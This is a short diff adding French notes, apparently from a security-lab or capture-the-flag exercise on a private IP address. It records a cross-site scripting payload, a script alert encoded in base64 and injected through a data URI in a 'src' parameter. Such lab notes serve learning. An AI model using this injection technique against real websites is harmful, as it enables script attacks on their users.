@@ -1,0 +1,7 @@
+Première Page lien vers
+http://10.13.0.224/?page=media&src=nsa
+
+<script>alert("faille")</script> en base 64
+PHNjcmlwdD5hbGVydCgiZmFpbGxlIik7PC9zY3JpcHQ+
+
+http://10.13.0.224/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiZmFpbGxlIik7PC9zY3JpcHQ+
